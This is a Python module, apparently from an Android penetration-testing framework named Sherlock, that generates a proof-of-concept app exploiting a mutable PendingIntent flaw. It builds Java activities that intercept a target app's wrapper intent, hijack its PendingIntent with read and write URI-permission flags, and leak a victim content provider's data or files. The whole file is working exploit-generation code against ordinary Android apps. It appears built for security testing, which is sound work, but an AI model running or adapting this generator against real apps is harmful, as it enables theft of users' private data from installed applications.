from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_int import OptInt
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "mutable_pending_intent_basic_activity"
        self._template = Template()


    def register_options(self):
        # option_state.add_options([
            # OptBool("IS_EXPORTED", [True, "Whether the target component is exported (Default: False)", False]),
            # OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
            # OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            # OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
            # OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            # OptStr("TARGET_CLASS", [False, "Target class name"]),
            # OptStr("PARCEL_EXTRA", [True, "Wrapper intent parcel extra key"]),
            # OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
            # OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
            # OptStr("WRAPPER_ACTION", [True, "Wrapper intent action to intercept"]),
            # OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
            # OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
            # OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
            # OptList("PUT_EXTRA", [False, "Intent extra data"]),
        # ])

        option_state.add_options({
            "exploit": [
                OptBool("IS_EXPORTED", [True, "Whether the target component is exported (Default: False)", False]),
                OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
                OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
                OptStr("TARGET_PACKAGE", [True, "Target package name"]),
                OptStr("TARGET_CLASS", [False, "Target class name"]),
                OptStr("ACTION_NAME", [False, "Intent action name"]),
                OptList("PUT_EXTRA", [False, "Intent extra data key-value pair (Usage: <key>,<value>;<key>,<value>;..)"]),
            ],
            "hijack_intent": [
                OptEnum("PROVIDER_TYPE", [True, "Content provider type [1: Share content, 2: Access to files] (Default: 1)", 1, [1, 2]]),
                OptStr("PARCEL_EXTRA", [True, "Wrapper intent parcel extra key"]),
                OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
                OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
                OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
                OptStr("WRAPPER_ACTION", [True, "Wrapper intent action to intercept"]),
                OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
                OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
            ]
        })

        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": []
            },
            "is_exported": {
                "pos": ["via_deeplink", "target_class"],
                "neg": []
            },
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        is_exported = opts['IS_EXPORTED']
        via_deeplink = opts['VIA_DEEPLINK']
        deeplink_uri = opts['DEEPLINK_URI']
        provider_uri = opts['PROVIDER_URI']
        target_package = opts['TARGET_PACKAGE']
        target_class = opts['TARGET_CLASS']
        action_name = opts['ACTION_NAME']
        parcel_extra = opts['PARCEL_EXTRA']
        bundle_extra = opts['BUNDLE_EXTRA']
        bundle_parcel = opts['BUNDLE_PARCEL']
        wrapper_action = opts['WRAPPER_ACTION']
        base_action = opts['BASE_ACTION']
        request_code = opts['REQUEST_CODE']
        provider_type = opts['PROVIDER_TYPE']
        put_extra = opts['PUT_EXTRA']

        exploit_activity_name = self.activity_name(self._id, target_package)
        intercept_activity_name = f'{self.activity_name(self._id, target_package)}Intercept'
        leak_provider_activity_name = f'{self.activity_name(self._id, target_package)}LeakProvider'

        manifest = [
            self._template.build_manifest_component(
                intercept_activity_name,
                is_exported=True,
                intercept=True,
                action=wrapper_action
            ),
            self._template.build_manifest_component(
                leak_provider_activity_name,
                is_exported=True,
                intercept=True,
                action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else base_action
            ),
            self._template.build_manifest_component(
                exploit_activity_name
            )
        ]

        hijack_activity = self._template.build_activity(
            name=intercept_activity_name,
            libs=[
                "android.app.PendingIntent",
                "android.content.ClipData",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Log",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            on_create=[
                f'Bundle bundle = getIntent().getBundleExtra("{bundle_extra}");' if bundle_extra != "" else "", 
                f'PendingIntent pi = bundle.getParcelable("{bundle_parcel}");' if bundle_extra != "" else "",
                f'PendingIntent pi = getIntent().getParcelableExtra("{parcel_extra}");' if bundle_extra == "" else "",
                self._template.build_intent(
                    intent_var="hijack",
                    set_action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else None,
                    set_clipdata=provider_uri,
                    set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                    start_activity=False
                ),
                f"try {{ pi.send(this, {request_code}, hijack, null, null); }} catch (PendingIntent.CanceledException e) {{ throw new RuntimeException(e); }}"
            ]
        )

        leak_provider_activity = self._template.build_activity(
            name=leak_provider_activity_name,
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            on_create=[
                "Uri uri = getIntent().getClipData().getItemAt(0).getUri();",
                self._template.resolve_content(provider_type)
            ]
        )

        exploit_activity = self._template.build_activity(
            name=exploit_activity_name,
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if via_deeplink else action_name if action_name != "" else None,
                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
                set_classname=[target_package, target_class] if not via_deeplink else []
            )]
        )

        component = [
            {
                "name": f"{intercept_activity_name}.java",
                "content": hijack_activity 
            },
            {
                "name": f"{leak_provider_activity_name}.java",
                "content": leak_provider_activity 
            },
            {
                "name": f"{exploit_activity_name}.java",
                "content": exploit_activity 
            }
        ]

        if not is_exported:
            manifest.pop()
            component.pop()

        app = {
            "manifest": manifest,
            "layout": self._template.button_layout(self._id, target_package) if is_exported else None,
            "bind_button": self._template.bind_button(self._id, target_package, exploit_activity_name) if is_exported else None,
            "component": component
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Module failed to execute, terminating module..\n")
            return
        
        self.check_component_log(opts)

        self.check_logcat()